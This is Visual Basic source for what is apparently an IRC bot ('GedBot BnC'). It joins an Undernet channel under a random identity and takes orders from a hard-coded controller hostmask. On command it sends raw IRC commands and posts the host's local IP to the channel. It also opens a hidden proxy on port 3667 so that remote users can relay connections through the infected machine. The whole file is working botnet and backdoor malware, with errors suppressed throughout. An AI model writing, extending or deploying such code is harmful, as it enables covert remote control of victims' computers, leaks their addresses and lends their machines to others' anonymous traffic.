   Attribute VB_Name = "Module1"
   Public Declare Function WSAStartup Lib "wsock32.dll" (ByVal wVR As Long, lpWSAD As WSADATAType) As Long
   Public Declare Function WSACleanup Lib "wsock32.dll" () As Long
   Public Declare Function WSAIsBlocking Lib "wsock32.dll" () As Long
   Public Declare Function WSACancelBlockingCall Lib "wsock32.dll" () As Long

   Public Const WSADescription_Len = 256
   Public Const WSASYS_Status_Len = 128

   Public Type WSADATAType
     wversion As Integer
     wHighVersion As Integer
     szDescription(0 To WSADescription_Len) As Byte
     szSystemStatus(0 To WSASYS_Status_Len) As Byte
     iMaxSockets As Integer
     iMaxUdpDg As Integer
     lpszVendorInfo As Long
   End Type

   Public Declare Function gethostname Lib "wsock32.dll" (ByVal hostname$, ByVal HostLen As Long) As Long
   Public Declare Function gethostbyname Lib "wsock32.dll" (ByVal hostname$) As Long

   Public Type HostEnt
     h_name As Long
     h_aliases As Long
     h_addrtype As Integer
     h_length As Integer
     h_addr_list As Long
   End Type

   Public Declare Function inet_addr Lib "wsock32.dll" (ByVal cp As String) As Long

   Public Const INADDR_NONE = &HFFFF
   Public Const INADDR_ANY = &H0
   Public Const hostent_size = 16
   Public Const sockaddr_size = 16
   Public Const INVALID_SOCKET = -1
   Public Const SOCKET_ERROR = -1
   Public Const SOCK_STREAM = 1
   Public Const AF_INET = 2
   Public Const IPPROTO_TCP = 6

   Public Declare Function setsockopt Lib "wsock32.dll" (ByVal s As Long, ByVal level As Long, ByVal optname As Long, optval As Any, ByVal optlen As Long) As Long
   Public Declare Function getsockopt Lib "wsock32.dll" (ByVal s As Long, ByVal level As Long, ByVal optname As Long, optval As Any, optlen As Long) As Long

   Public Const SOL_SOCKET = &HFFFF&
   Public Const SO_LINGER = &H80&

   Public Type LingerType
     l_onoff As Integer
     l_linger As Integer
   End Type

   Public Declare Function accept Lib "wsock32.dll" (ByVal s As Long, addr As sockaddr, addrlen As Long) As Long
   Public Declare Function htonl Lib "wsock32.dll" (ByVal hostlong As Long) As Long
   Public Declare Function htons Lib "wsock32.dll" (ByVal hostshort As Long) As Integer
   Public Declare Function socket Lib "wsock32.dll" (ByVal af As Long, ByVal s_type As Long, ByVal protocol As Long) As Long
   Public Declare Function connect Lib "wsock32.dll" (ByVal s As Long, addr As sockaddr, ByVal namelen As Long) As Long
   Public Declare Function send Lib "wsock32.dll" (ByVal s As Long, buf As Any, ByVal buflen As Long, ByVal flags As Long) As Long
   Public Declare Function recv Lib "wsock32.dll" (ByVal s As Long, buf As Any, ByVal buflen As Long, ByVal flags As Long) As Long
   Public Declare Function closesocket Lib "wsock32.dll" (ByVal s As Long) As Long
   Public Declare Function bind Lib "wsock32.dll" (ByVal s As Long, addr As sockaddr, ByVal namelen As Long) As Long
   Public Declare Function listen Lib "wsock32.dll" (ByVal s As Long, ByVal backlog As Long) As Long

   Public Type sockaddr
     sin_family As Integer
     sin_port As Integer
     sin_addr As Long
     sin_zero As String * 8
   End Type

   Public Declare Function WSAAsyncSelect Lib "wsock32.dll" (ByVal s As Long, ByVal hwnd As Long, ByVal wMsg As Long, ByVal lEvent As Long) As Long

   Public Const FD_READ = &H1&
   Public Const FD_CONNECT = &H10&
   Public Const FD_CLOSE = &H20&
   Public Const FD_ACCEPT = &H8&

   Private Declare Function InternetGetConnectedState Lib "wininet.dll" (ByRef IpdwFlags As Long, ByVal dwReserved As Long) As Long
   Public Declare Sub Sleep Lib "kernel32" (ByVal dwMilliseconds As Long)
   Public Declare Sub MemCopy Lib "kernel32" Alias "RtlMoveMemory" (Dest As Any, ByVal Src As Long, ByVal cb&)
   Public Declare Function CallWindowProc Lib "user32" Alias "CallWindowProcA" (ByVal lpPrevWndFunc As Long, ByVal hwnd As Long, ByVal Msg As Long, ByVal wParam As Long, ByVal lParam As Long) As Long
   Public Declare Function SetWindowLong Lib "user32" Alias "SetWindowLongA" (ByVal hwnd As Long, ByVal nIndex As Long, ByVal dwNewLong As Long) As Long
   Public Const GWL_WNDPROC = -4
   Private lpPrevWndProc As Long
   Dim rtncode As String, bSock As Long, lSock As Long, cSock As Long, sSock As Long, rCh As String
   Dim cNick As String, cUser As String, bc As Boolean, BnC As Boolean

   Public Function StartWinsock() As Boolean
   On Error Resume Next
   Dim StartupData As WSADATAType
   StartWinsock = IIf(WSAStartup(&H101, StartupData) = 0, True, False)
   End Function

   Public Sub EndWinsock()
   On Error Resume Next
   Dim l As Long
   If WSAIsBlocking() Then l = WSACancelBlockingCall()
   l = WSACleanup()
   End Sub

   Public Sub ConectBot()
   On Error Resume Next
   Call Hook(Form1.hwnd)
   If Not (StartWinsock()) And Not (iStat()) Then Exit Sub
   If Not (BnC) Then Call StartBnC
   bSock = ConnectSock("irc.undernet.org", Form1.hwnd, 6667, 1025)
   If bSock = INVALID_SOCKET Then Exit Sub
   Call pSock
   Sleep 3000
   Call SendData(bSock, GNU)
   Call pSock
   Sleep 3000
   Call SendData(bSock, GSU)
   Call pSock
   rCh = Mid(GNU, 6, 9)
   Sleep 10000
   Call SendData(bSock, "JOIN #" & rCh & vbCrLf)
   Sleep 10000
   Call SendData(bSock, "TOPIC #" & rCh & " IREUL" & vbCrLf)
   Sleep 10000
   End Sub

   Function GetHostByNameAlias(ByVal hostname) As Long
   On Error Resume Next
   Dim rgn As Long, addrList As Long, rIP As Long, getHost As HostEnt

   rIP = inet_addr(hostname)

   If rIP = INADDR_NONE Then
    rgn = gethostbyname(hostname)
     If rgn <> 0 Then
       MemCopy getHost, ByVal rgn, hostent_size
       MemCopy addrList, ByVal getHost.h_addr_list, 4
       MemCopy rIP, ByVal addrList, getHost.h_length
       Else
       rIP = INADDR_NONE
     End If
   End If

   GetHostByNameAlias = rIP
   End Function

   Public Function ConnectSock(ByVal Host As String, ByVal hwnd As Long, Port As Long, wLong As Long) As Long
   On Error Resume Next
   Dim s As Long, selectops As Long, sockin As sockaddr

   sockin.sin_family = AF_INET
   sockin.sin_port = htons(Port)

   If sockin.sin_port = INVALID_SOCKET Then: ConnectSock = INVALID_SOCKET: Exit Function

   sockin.sin_addr = GetHostByNameAlias(Host)

   If sockin.sin_addr = INADDR_NONE Then ConnectSock = INVALID_SOCKET: Exit Function

   s = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP)

   If s < 0 Then ConnectSock = INVALID_SOCKET: Exit Function

   If SetSockLinger(s, 1, 0) = SOCKET_ERROR Then
       If s > 0 Then Call closesocket(s)
       ConnectSock = INVALID_SOCKET: Exit Function
   End If

    selectops = FD_READ Or FD_CONNECT Or FD_CLOSE

    If WSAAsyncSelect(s, hwnd, ByVal wLong, ByVal selectops) Then
       If s > 0 Then Call closesocket(s)
       ConnectSock = INVALID_SOCKET: Exit Function
    End If

   If connect(s, sockin, sockaddr_size) <> SOCKET_ERROR Then
    If s > 0 Then Call closesocket(s)
    ConnectSock = INVALID_SOCKET: Exit Function
   End If

   ConnectSock = s
   End Function

   Public Function SetSockLinger(ByVal SockNum As Long, ByVal OnOff As Integer, ByVal LingerTime As Integer) As Long
   On Error Resume Next

   Dim Linger As LingerType
    Linger.l_onoff = OnOff
    Linger.l_linger = LingerTime

   If setsockopt(SockNum, SOL_SOCKET, SO_LINGER, Linger, 4) <> 0 Then
   SetSockLinger = SOCKET_ERROR
   Else

   If getsockopt(SockNum, SOL_SOCKET, SO_LINGER, Linger, 4) <> 0 Then
   SetSockLinger = SOCKET_ERROR
   End If

   End If
   End Function

   Public Function SendData(ByVal s As Long, vMessage As Variant) As Long
   On Error Resume Next
   Dim TheMsg() As Byte
               TheMsg = StrConv(vMessage, vbFromUnicode)
   If UBound(TheMsg) > -1 Then
       SendData = send(s, TheMsg(0), (UBound(TheMsg) - LBound(TheMsg) + 1), 0)
   End If
   End Function

   Public Function iStat() As Boolean
   On Error Resume Next
   iStat = IIf(InternetGetConnectedState(0&, 0&) <> 0, True, False)
   End Function

   Public Function Hook(ByVal hwnd As Long)
       On Error Resume Next
       lpPrevWndProc = SetWindowLong(hwnd, GWL_WNDPROC, AddressOf WindowProc)
   End Function

   Public Sub UnHook(ByVal hwnd As Long)
       On Error Resume Next
       Call SetWindowLong(hwnd, GWL_WNDPROC, lpPrevWndProc)
   End Sub

   Public Function WindowProc(ByVal hw As Long, ByVal uMsg As Long, ByVal wParam As Long, ByVal lParam As Long) As Long
   On Error Resume Next
   Dim x As Long, y As Long, z As Long
   Dim ReadBuffer(1000) As Byte, ReadBufferB(1000) As Byte, ReadBufferC(1000) As Byte
   Dim ctncode As String, rptClient As String, rptServer As String
   WelClient$ = "GedBot BnC v1.0" & vbCrLf & "/con <server> <port>" & vbCrLf & "Para Salir /ExitBnC"

   Select Case uMsg

    Case 1025

      Select Case lParam
   Case FD_READ
       x = recv(bSock, ReadBuffer(0), 1000, 0)
       If x > 0 Then
       ctncode = StrConv(ReadBuffer, vbUnicode)
       Call EvalCode(ctncode)
       End If
   Case FD_CONNECT
       rtncode = "conect"
   Case FD_CLOSE
       rtncode = "cerro"
       Call closesocket(bSock)
       Form1.Timer1.Enabled = True
      End Select

    Case 1026

      Select Case lParam
       Case FD_ACCEPT
       cSock = AcceptSock(lSock, Form1.hwnd, 1027)
        If cSock <> INVALID_SOCKET Then
        Call SendData(cSock, WelClient$ & vbCrLf)
        End If
       End Select

    Case 1027

      Select Case lParam
       Case FD_READ
       y = recv(cSock, ReadBufferB(0), 1000, 0)
       If y > 0 Then
       rptClient = StrConv(ReadBufferB, vbUnicode)
       Call EvalCodeB(rptClient)
       End If

       Case FD_CLOSE
       Call closesocket(sSock)
       Call closesocket(cSock)
       bc = False
      End Select

    Case 1028
      Select Case lParam
      Case FD_READ
      z = recv(sSock, ReadBufferC(0), 1000, 0)
       If z > 0 Then
       rptServer = StrConv(ReadBufferC, vbUnicode)
       Call EvalCodeC(rptServer)
       End If

      Case FD_CONNECT
      rtncode = "conect"

      Case FD_CLOSE
      Call closesocket(sSock)
      Call SendData(cSock, WelClient$ & vbCrLf)
      bc = False
      End Select
   End Select

       WindowProc = CallWindowProc(lpPrevWndProc, hw, uMsg, wParam, lParam)
   End Function

   Private Function pSock() As Boolean
   On Error Resume Next: Dim TimeOut As Variant
   TimeOut = Timer + 60
   While Len(rtncode) = 0
           DoEvents
           If Timer > TimeOut Then
               pSock = False
               Exit Function
           End If
   Wend
   rtncode = "": pSock = True
   End Function

   Private Function GNU()
   On Error Resume Next: Randomize
   GNU = GNU & "NICK "
   For i = 0 To 8
   GNU = GNU & Chr(Int(Rnd * 25) + 65)
   Next
   GNU = GNU & vbCrLf
   End Function

   Private Function GSU()
   On Error Resume Next
   GSU = GSU & "USER "
   For i = 0 To 6
   GSU = GSU & Chr(Int(Rnd * 25) + 65)
   Next
   ur = Array("terra.com", "hotmail.com", "zonav.org", "aol.com", "msn.com", "latinmail.com", "yahoo.com", "startmedia.com", "prodigy.mx")
   us = ur(Int(Rnd * 9))
   GSU = GSU & Chr(32) & Chr(34) & us & Chr(34) & Chr(32) & Chr(34) & GetLclIP & Chr(34) & Chr(32) & ":" & us & vbCrLf
   End Function

   Private Function GetLclIP()
   On Error Resume Next
   If Not (StartWinsock) Then Call EndWinsock: Exit Function
   Dim hostname As String * 256, hostent_addr As Long
   Dim Host As HostEnt, hostip_addr As Long, temp_ip_address() As Byte
   Dim i As Integer, ip_address As String

   If gethostname(hostname, 256) = -1 Then
   Exit Function
   Else
   hostname = Trim$(hostname)
   End If

   hostent_addr = gethostbyname(hostname)

   If hostent_addr = 0 Then Exit Function

   MemCopy Host, hostent_addr, LenB(Host)

   MemCopy hostip_addr, Host.h_addr_list, 4

   Do
   ReDim temp_ip_address(1 To Host.h_length)
   MemCopy temp_ip_address(1), hostip_addr, Host.h_length

   ip_address = ""

   For i = 1 To Host.h_length
   ip_address = ip_address & "." & temp_ip_address(i)
   Next

   ip_address = Mid$(ip_address, 2)

   Host.h_addr_list = Host.h_addr_list + LenB(Host.h_addr_list)
   MemCopy hostip_addr, Host.h_addr_list, 4
   Loop While (hostip_addr <> 0)

   GetLclIP = ip_address

   Call EndWinsock
   End Function

   Private Sub EvalCode(Code)
   On Error Resume Next
   If UCase(Left(Code, 4)) = "PING" Then
     Rpt = "PONG :" & Right(Code, Len(Code) - 5)
     Call SendData(bSock, Rpt & vbCrLf)
   ElseIf InStr(UCase(Code), "SMD") <> 0 Then
     If UCase(Split(Split(Code, Chr(32))(0), "@")(1)) = UCase("DarkMachine.users.undernet.org") Then
     Sleep 1000
     Call SendData(bSock, Split(Code, Chr(32), 5)(4) & vbCrLf)
     End If
   ElseIf InStr(UCase(Code), "GETIP") <> 0 Then
     Sleep 1000
     Call SendData(bSock, "PRIVMSG #" & rCh & " :" & GetLclIP & vbCrLf)
   End If
   rtncode = Code
   End Sub

   Private Sub EvalCodeB(codel)
   On Error Resume Next
   If UCase(Left(codel, 4)) = "NICK" Then cNick = Left(codel, InStr(codel, Chr(0)) - 2)

   If UCase(Left(codel, 4)) = "USER" Then cUser = Left(codel, InStr(codel, Chr(0)) - 2)

   If UCase(Left(codel, 3)) = "CON" Then Call BnCServer(Left(codel, InStr(codel, Chr(0)) - 2))

   If UCase(Left(codel, 7)) = "EXITBNC" Then Call closesocket(cSock): Call closesocket(sSock)

   If bc Then Call SendData(sSock, Left(codel, InStr(codel, Chr(0)) - 2) & vbCrLf)

   End Sub

   Private Sub EvalCodeC(codes)
   On Error Resume Next
   If bc Then Call SendData(cSock, Left(codes, InStr(codes, Chr(0)) - 2) & vbCrLf)
   End Sub

   Private Sub StartBnC()
   On Error Resume Next
   lSock = ListenSock(3667, Form1.hwnd, 1026)
   If lSock = INVALID_SOCKET Then Exit Sub
   BnC = True
   End Sub

   Private Sub BnCServer(sParam)
   On Error Resume Next
   rtncode = ""
   sSock = ConnectSock(Split(sParam, Chr(32))(1), Form1.hwnd, CLng(Split(sParam, Chr(32))(2)), 1028)
   If sSock = INVALID_SOCKET Then Call SendData(cSock, "No Conection" & vbCrLf): Call closesocket(cSock): Exit Sub
   bc = True
   Call pSock
   Call SendData(sSock, cNick & vbCrLf)
   Sleep 1000
   Call SendData(sSock, cUser & vbCrLf)
   Sleep 1000
   End Sub

   Public Function ListenSock(ByVal Port As Long, ByVal hwnd As Long, wLong As Long) As Long
   On Error Resume Next
   Dim s As Long, selectops As Long
   Dim sockin As sockaddr

   sockin.sin_family = AF_INET
   sockin.sin_port = htons(Port)

   If sockin.sin_port = INVALID_SOCKET Then ListenSock = INVALID_SOCKET: Exit Function

   sockin.sin_addr = htonl(INADDR_ANY)

   If sockin.sin_addr = INADDR_NONE Then ListenSock = INVALID_SOCKET: Exit Function

   s = socket(AF_INET, SOCK_STREAM, 0)

   If s < 0 Then ListenSock = INVALID_SOCKET: Exit Function

   If bind(s, sockin, sockaddr_size) = -1 Then
      If s > 0 Then Call closesocket(s)
      ListenSock = INVALID_SOCKET: Exit Function
   End If

   selectops = FD_READ Or FD_CLOSE Or FD_ACCEPT

   If WSAAsyncSelect(s, hwnd, ByVal wLong, ByVal selectops) Then
      If s > 0 Then Call closesocket(s)
      ListenSock = INVALID_SOCKET: Exit Function
   End If

   If listen(s, 1) Then
      If s > 0 Then Call closesocket(s)
      ListenSock = INVALID_SOCKET: Exit Function
   End If

   ListenSock = s
   End Function

   Private Function AcceptSock(ByVal sock, ByVal hwnd, ByVal wLong)
   On Error Resume Next
   Dim bClient As sockaddr, selectops As Long, s As Long

   s = accept(sock, bClient, sockaddr_size)

   If s = INVALID_SOCKET Then AcceptSock = INVALID_SOCKET: Exit Function

   selectops = FD_READ Or FD_CLOSE

   If WSAAsyncSelect(s, hwnd, ByVal wLong, ByVal selectops) Then
      If s > 0 Then Call closesocket(s)
      AcceptSock = INVALID_SOCKET: Exit Function
   End If

   AcceptSock = s
   End Function
